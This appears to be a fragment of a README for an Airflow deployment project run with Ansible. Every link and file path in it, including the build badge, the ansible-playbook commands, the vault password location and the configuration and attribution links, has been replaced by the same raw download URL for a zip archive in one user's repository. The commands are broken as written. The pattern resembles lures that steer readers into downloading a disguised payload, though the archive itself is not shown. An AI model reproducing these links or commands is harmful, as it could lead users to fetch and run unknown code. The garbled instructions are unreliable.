...
[![Build Status](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip)](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip)
...
```bash
ansible-playbook https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip -e 'https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip' -e "command='test example spark 20160101'"
```
...
```bash
ansible-playbook https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip -e 'https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip'
...
This requires the Vault's password file to be located on `https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip`, so
Ansible is able to decrypt the production variables.

### Configuration

Our Airflow instance will need a few configuration variables and connections to be able to run the supplied DAGs. Please follow the [https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip) file in order to know what those variable mean and how to use them.
...
- Check if the task / run you want to re-run is visible in the DAG's Tree View UI
  - For example, [the `main_summary` DAG tree view](https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip).
...
This repository is heavily based on https://github.com/alvurqoni/opentrials-airflow/raw/refs/heads/master/dags/airflow-opentrials-v1.1.zip
